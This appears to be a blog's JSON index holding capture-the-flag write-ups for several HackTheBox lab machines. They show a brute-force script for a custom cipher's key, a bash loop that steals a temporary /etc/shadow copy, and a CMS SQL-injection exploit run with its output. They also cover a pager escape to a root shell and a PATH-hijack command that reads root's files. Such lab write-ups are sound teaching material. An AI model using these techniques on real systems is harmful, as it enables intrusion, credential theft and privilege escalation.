keyPos = 0     decrypted = \"\"     for x in text:         keyChr = key[keyPos]         newChr = ord(x)         newChr = chr((newChr - ord(keyChr)) % 255)         decrypted += newChr         keyPos += 1         keyPos = keyPos % keylen     return decrypted  parser = argparse.ArgumentParser(description='Encrypt with 0bscura\\'s encryption algorithm')  parser.add_argument('-i',                     metavar='InFile',                     type=str,                     help='The file to read',                     required=False)  parser.add_argument('-o',                     metavar='OutFile',                     type=str,                     help='Where to output the encrypted/decrypted file',                     required=False)  parser.add_argument('-k',                     metavar='Key',                     type=str,                     help='Key to use',                     required=False)  parser.add_argument('-d', action='store_true', help='Decrypt mode')  args = parser.parse_args()  banner = \"################################\\n\" banner+= \"#           BEGINNING          #\\n\" banner+= \"#    SUPER SECURE ENCRYPTOR    #\\n\" banner+= \"################################\\n\" banner += \"  ############################\\n\" banner += \"  #        FILE MODE         #\\n\" banner += \"  ############################\" print(banner) if args.o == None or args.k == None or args.i == None:     print(\"Missing args\") else:     if args.d:         print(\"Opening file {0}...\".format(args.i))         with open(args.i, 'r', encoding='UTF-8') as f:             data = f.read()          print(\"Decrypting...\")         decrypted = decrypt(data, args.k)          print(\"Writing to {0}...\".format(args.o))         with open(args.o, 'w', encoding='UTF-8') as f:             f.write(decrypted)     else:         print(\"Opening file {0}...\".format(args.i))         with open(args.i, 'r', encoding='UTF-8') as f:             data = f.read()          print(\"Encrypting...\")         encrypted = encrypt(data, args.k)          print(\"Writing to {0}...\".format(args.o))         with open(args.o, 'w', encoding='UTF-8') as f:             f.write(encrypted)   while the contents of check.txt, out.txt and passwordreminder.txt is  root@kali:~/Documents/CTF/HTB/Machine/Obscurity/robert# cat check.txt Encrypting this file with your key should result in out.txt, make sure your key is correct!   root@kali:~/Documents/CTF/HTB/Machine/Obscurity/robert# hd out.txt 00000000  c2 a6 c3 9a c3 88 c3 aa  c3 9a c3 9e c3 98 c3 9b  |................| 00000010  c3 9d c3 9d c2 89 c3 97  c3 90 c3 8a c3 9f c2 85  |................| 00000020  c3 9e c3 8a c3 9a c3 89  c2 92 c3 a6 c3 9f c3 9d  |................| 00000030  c3 8b c2 88 c3 9a c3 9b  c3 9a c3 aa c2 81 c3 99  |................| 00000040  c3 89 c3 ab c2 8f c3 a9  c3 91 c3 92 c3 9d c3 8d  |................| 00000050  c3 90 c2 85 c3 aa c3 86  c3 a1 c3 99 c3 9e c3 a3  |................| 00000060  c2 96 c3 92 c3 91 c2 88  c3 90 c3 a1 c3 99 c2 a6  |................| 00000070  c3 95 c3 a6 c3 98 c2 9e  c2 8f c3 a3 c3 8a c3 8e  |................| 00000080  c3 8d c2 81 c3 9f c3 9a  c3 aa c3 86 c2 8e c3 9d  |................| 00000090  c3 a1 c3 a4 c3 a8 c2 89  c3 8e c3 8d c3 9a c2 8c  |................| 000000a0  c3 8e c3 ab c2 81 c3 91  c3 93 c3 a4 c3 a1 c3 9b  |................| 000000b0  c3 8c c3 97 c2 89 c2 81  76                       |........v| 000000b9   root@kali:~/Documents/CTF/HTB/Machine/Obscurity/robert# hd passwordreminder.txt 00000000  c2 b4 c3 91 c3 88 c3 8c  c3 89 c3 a0 c3 99 c3 81  |................| 00000010  c3 91 c3 a9 c2 af c2 b7  c2 bf 6b                 |..........k| 0000001b   We need to find the secret key in order to be able to decrypt the passwordreminder.txt file and authenticate ourselves as robert. To do this, we need to analyse the encryption script and crack out.txt  Because out.txt and check.txt are ‚Äúbrothers‚Äù (they depend on each other), what we want to do is use the SuperSecureCrypt.py encryption mechanism to brute-force each character of the alphabet with each character inside check.txt, until get out.txt.  To do this, we just need to build a quick python script  import string  banner = \"################################\\n\" banner+= \"#           BEGINNING          #\\n\" banner+= \"#    SUPER SECURE ENCRYPTOR    #\\n\" banner+= \"################################\\n\" banner+= \"################################\\n\" banner+= \"#        BRUTE FORCE MODE      #\\n\" banner+= \"################################\" print(banner)  key = \"\"  with open('check.txt','r',encoding='UTF-8') as f:     clearFile = f.read()  with open('out.txt','r',encoding='UTF-8') as f:     cryptedFile = f.read()     indCrypt = 0     for cryptChr in cryptedFile:    # ciclo ogni carattere criptato          for incr in range(1,255):    # provo ogni valore di chiave             newChr = ord(cryptChr)             newChr = chr((newChr - incr) % 255)             if newChr == clearFile[indCrypt]:                 key += chr(incr)                 break                # vado alla lettera criptata successiva         indCrypt = indCrypt +1        # tengo il conto della posizione del carattere      print(key)   Running our script, we will get the secret password, and through the password we will be able to decode passwordreminder.txt      Password found! Now we can use it via the command su to become Robert.   Privilege Escalation  Like the rest of the machine, the privilege escalation path is also based on the exploitation of a custom component of the box. By running the sudo -l command we will notice how the user can run the BetterSSH.py script with root permissions.  BetterSSH.py source is the following:  import sys import random, string import os import time import crypt import traceback import subprocess  path = ''.join(random.choices(string.ascii_letters + string.digits, k=8)) session = {\"user\": \"\", \"authenticated\": 0} try:     session['user'] = input(\"Enter username: \")     passW = input(\"Enter password: \")      with open('/etc/shadow', 'r') as f:         data = f.readlines()     data = [(p.split(\":\") if \"$\" in p else None) for p in data]     passwords = []     for x in data:         if not x == None:             passwords.append(x)      passwordFile = '\\n'.join(['\\n'.join(p) for p in passwords])     with open('/tmp/SSH/'+path, 'w') as f:         f.write(passwordFile)     time.sleep(.1)     salt = \"\"     realPass = \"\"     for p in passwords:         if p[0] == session['user']:             salt, realPass = p[1].split('$')[2:]             break      if salt == \"\":         print(\"Invalid user\")         os.remove('/tmp/SSH/'+path)         sys.exit(0)     salt = '$6$'+salt+'$'     realPass = salt + realPass      hash = crypt.crypt(passW, salt)      if hash == realPass:         print(\"Authed!\")         session['authenticated'] = 1     else:         print(\"Incorrect pass\")         os.remove('/tmp/SSH/'+path)         sys.exit(0)     os.remove(os.path.join('/tmp/SSH/',path)) except Exception as e:     traceback.print_exc()     sys.exit(0)  if session['authenticated'] == 1:     while True:         command = input(session['user'] + \"@Obscure$ \")         cmd = ['sudo', '-u',  session['user']]         cmd.extend(command.split(\" \"))         proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)          o,e = proc.communicate()         print('Output: ' + o.decode('ascii'))         print('Error: '  + e.decode('ascii')) if len(e.decode('ascii')) &gt; 0 else print('')   Here we can follow two methods to get root permissions:     Intercept the file with /etc/shadow contents   Exploit the code vulnerability   To save time, I decided to follow the first path.  Since the script temporarily saves the contents of /etc/shadow within a randomly named file in /tmp/SSH, it is possible to intercept it and move it before the script removes it.  To do this, we have to create the following mini-script:  #!/bin/bash  while : do     find \"/tmp/SSH\" -type f -exec mv {} /tmp/tmp \\; done   and run it, simultaneously execute BetterSSH.py with sudo.    The program will return an error because it will not be able to delete the file that we have intercepted.  On the other hand, by opening the intercepted file, we will be able to extract the hash of the root user to crack it with john. Once the password is obtained, we can use the su command to authenticate as root.    Trophy Notoriety wasn't as good as fame, but was heaps better than obscurity. - Neil Gaiman"
  },
  
  {
    "title": "HackTheBox - Traverxec",
    "url": "/posts/traverxec/",
    "categories": "Articles & Writeups, HackTheBox",
    "tags": "hackthebox",
    "date": "2019-11-16 00:00:00 +0100",
    "content": "Improved skills:     nostromo exploitation   SSH keys cracking   journalctl privilege escalation (GTFO)   Used tools:     nmap   searchsploit   LinEnum.sh   hashcat   ssh2john   john     Introduction &amp; Foothold  Let‚Äôs start to scan the box with nmap  $ nmap -O -A -sV --script=banner -oN nmap.txt 10.10.10.165 # Nmap 7.80 scan initiated Tue Feb 18 22:09:54 2020 as: nmap -O -A -sV --script=banner -oN nmap.txt 10.10.10.165 Nmap scan report for 10.10.10.165 Host is up (0.049s latency). Not shown: 998 filtered ports PORT   STATE SERVICE VERSION 22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0) |_banner: SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u1 80/tcp open  http    nostromo 1.9.6 |_http-server-header: nostromo 1.9.6 Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.18 (92%), Linux 3.2 - 4.9 (92%), Crestron XPanel control system (90%), Linux 3.16 (89%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  TRACEROUTE (using port 80/tcp) HOP RTT      ADDRESS 1   48.90 ms 10.10.14.1 2   49.13 ms 10.10.10.165  OS and Service detection performed. Please report any incorrect results at [URL]https://nmap.org/submit/[/URL] . # Nmap done at Tue Feb 18 22:10:25 2020 -- 1 IP address (1 host up) scanned in 31.98 seconds   From the output above we can notice that there are only two services running on the box: OpenSSH on port 22 and a nostromo 1.9.6 running on the port 80.  Taking a look to the web site we notice that it is made up only by static-pages. This reduce our attack surface. However, a rapid search online reveals that this particular web server version is vulnerable to an RCE vulnerability (CVE-2019-16278) and a public exploit exists (id 47837).  All we have to do is download the exploit, create a listening server with netcat and get our reverse shell    Lateral movement to David  Now that we have a shell, we can take a look to which user the box has. We notice that the machine user is david.  To speed up the post exploitation process, we can upload on our target LinEnum.sh and run it. The tools reveals that it found a password hash saved in the nostromo backup file /var/nostromo/conf/.htpasswd.    We can try to crack it with hashcat while we perform some other recon.    After few minutes hashcat reveals that the hashed password was Nowonly4me, however trying to use it around we find that it‚Äôs useless. Rabbit hole!  Browsing the configuration files of the web server some useful information come out from /var/nostromo/conf/nhttpd    From the configuration it seems that in /home directories may be present a public_www directory. Browsing the supposed folder not only we discover that it really exists, but also that inside it is contained an interesting folder called protected-file-area.  Inside it we discovered a backup archive containing david SSH keys.    Now we have to crack them so let‚Äôs create the hash of the private key with ssh2john and after we get it, let‚Äôs crack it with john:    Well done, we have found david‚Äôs SSH password. Now we can login via SSH and proceeds with the privesc phase.  Privilege Escalation  Taking a look at the david‚Äôs home directory we noticed the bin folder, which contains two files inside, one of which is a script.    We can see how the journalctl command is executed via sudo, and the result is then passed to the cat command to display it uniformly on the screen.  I have searched far and wide for the web for a possible exploit for journalctl, but without finding anything. After a few hours of research, I landed on a page called GTFObins, where there was talks about different method to perform privilege escalation through the program in question and many others. Here is the link to the page: https://gtfobins.github.io/gtfobins/journalctl/.  I quote what is said on the page:     ‚Ä¶    This invokes the default pager, which is likely to be less, other functions may apply.   In simple words: to display the output of the command on the screen, the journalctl program uses the less command by default (for this reason, in the script it was then redirected to the cat command). However, this command ‚Äúhas a defect‚Äù: once executed, it waits for a command from a user.  In this situation, however, it is possible to escape from the less command. Since journalctl can be run with elevated privileges via the sudo command, using the feature of the less command it is possible to obtain a shell as root!    Now type :!/bin/bash and‚Ä¶    ‚Ä¶ obtain a root shell!  Trophy    Everything is a copy of a copy of a copy.  - Chuck Palahniuk, Fight Club"
  },
  
  {
    "title": "HackTheBox - Writeup",
    "url": "/posts/writeup/",
    "categories": "Articles & Writeups, HackTheBox",
    "tags": "hackthebox",
    "date": "2019-06-08 00:00:00 +0200",
    "content": "Improved ability:     CVE Research   Source code review   $PATH based privilege escalation   Used tools:     nmap   searchsploit   pspy64     Introduction &amp; Foothold:  Let‚Äôs start with a common full nmap scan on the box:  $ nmap -A 10.10.10.138     The only available ports are the port 22 (with OpenSSH 7.4p1) and the  port 80, running Apache httpd 2.4.25. Because of this version of OpenSSH doesn‚Äôt have known vulnerability,  let‚Äôs analyse the root and /writeup/ folder (contained into the robots.txt) with a web browser.  Once inside the root, we will prompted with an old-school floppy-disk background and a tips saying that because the site was attacked, it has been implemented a DoS protection that potentially can block us from performing brute-force enumeration.   Let‚Äôs move analyse the /writeup/ folder:   Here we can find some old writeups, but nothing very useful. However, looking at the source code, we are able to find the first important information: the CMS type.   Now that we know our target use CMS Made Simple, we can search online for public exploit. Suddenly, though the usage of searchsploit we found the right script to compromise our target  $ searchsploit 'cms made simple' -------------------------------------------------------------------------------------------------------------------- Exploit Title                                                                       | Path --------------------------------------------------------------------------------------------------------------------- CMS Made Simple (CMSMS) Showtime2 - File Upload Remote Code Execution (Metasploit)  | exploits/php/remote/46627.rb CMS Made Simple 0.10 - 'Lang.php' Remote File Inclusion                             | exploits/php/webapps/26217.html CMS Made Simple 0.10 - 'index.php' Cross-Site Scripting                             | exploits/php/webapps/26298.txt CMS Made Simple 1.0.2 - 'SearchInput' Cross-Site Scripting                          | exploits/php/webapps/29272.txt ... CMS Made Simple &lt; 2.2.10 - SQL Injection                                            | exploits/php/webapps/46635.py   Gaining access as jkr  Analysing every record, notice how the SQL injection exploit (46635) is valid for every version under the 2.2.10. Download and execute the script!  $ searchsploi -m 46635 $ python 46635.py -u http://10.10.10.138/writeup/ --crack -w /usr/share/wordlist/rockyou.txt [+] Salt for password found: 5a599ef579066807 [+] Username found: jkr [+] Email found: jkr@writeup.htb [+] Password found: 62def4866937f08cc13bab43bb14e6f7 [+] Password cracked: raykayjay9   Good! We have the user password. Now we can login into the box as jkr and proceeds to the privilege escalation phase.  $ ssh jkr@10.10.10.138 $ cat /home/jkr/user.txt d4e493fd4068af...   Privilege Escalation  After looking for a long time for passwords, misconfiguration or other forms of escalation, I decided to take a closer look to every process running on the machine, so I downloaded pspy and launched it.  After a while, mine attention were caught by these few lines:  2019/10/11 10:35:58 CMD: UID=0    PID=2279   | sshd: [accepted] 2019/10/11 10:35:58 CMD: UID=102  PID=2280   | sshd: [net]    2019/10/11 10:36:00 CMD: UID=0    PID=2281   | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d &gt; /run/motd.dynamic.new      2019/10/11 10:36:00 CMD: UID=0    PID=2282   | run-parts --lsbsysinit /etc/update-motd.d 2019/10/11 10:36:00 CMD: UID=0    PID=2283   | /bin/sh /etc/update-motd.d/10-uname 2019/10/11 10:36:00 CMD: UID=0    PID=2284   | /bin/sh /etc/update-motd.d/10-uname 2019/10/11 10:36:00 CMD: UID=0    PID=2285   | sshd: jkr [priv]   It seems that every time someone logs in, the /etc/update-motd.d/10-uname script is executed. The contents of the scripts are the following:  jkr@writeup:/etc/update-motd.d$ cat 10-uname #!/bin/sh uname -rnsom jkr@writeup:/etc/update-motd.d$ uname -rnsom Linux writeup 4.9.0-8-amd64 x86_64 GNU/Linux   It is clear the script execute a uname without using any kind of path, searching the right binary into the $PATH variable.  In case we are able to write inside one of the directories contained in $PATH and before the script identifies the original uname binary, we can run arbitrary code as root and execute our escalation (that because the 10-uanme process run with UID=0, so it runs as root)  $PATH contains the following directories:  jkr@writeup:/home/jkr$ ls -l -d /usr/local/sbin /usr/local/bin /usr/sbin /usr/bin /sbin /bin drwxr-xr-x 2 root root   4096 Apr 19 04:24 /bin drwxr-xr-x 2 root root   4096 Apr 19 04:14 /sbin drwxr-xr-x 2 root root  20480 Apr 24 13:13 /usr/bin drwx-wsr-x 2 root staff 20480 Jul 10 17:27 /usr/local/bin drwx-wsr-x 2 root staff 12288 Jul 10 17:23 /usr/local/sbin drwxr-xr-x 2 root root   4096 Apr 19 07:31 /usr/sbin   two of which allow staff group users to write into them.  Because jkr is part of the staff group, we are able to create a custom script named uname that will be executed in place of the original script once someone logs in.  jkr@writeup:/etc/update-motd.d$ echo \"cat /root/root.txt\" &gt; /usr/local/sbin/uname jkr@writeup:/etc/update-motd.d$ chmod +x /usr/local/sbin/uname jkr@writeup:/etc/update-motd.d$ exit root@0xbro:~/Documents/CTF/HTB/Writeup# ssh jkr@10.10.10.138 jkr@10.10.10.138 password: eeba47f60b48ef92...  The programs included with the Devuan GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/copyright.  Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Wed Jul 10 17:35:19 2019 from 10.10.15.117 jkr@writeup:~$   Once this escalation has been found, it is possible get a reverse shell as root rather than performing other actions as superuser.  Trophy The only way of discovering the limits of the possible is to venture a little way past them into the impossible. - Arthur C. Clarke"
  }
  
]

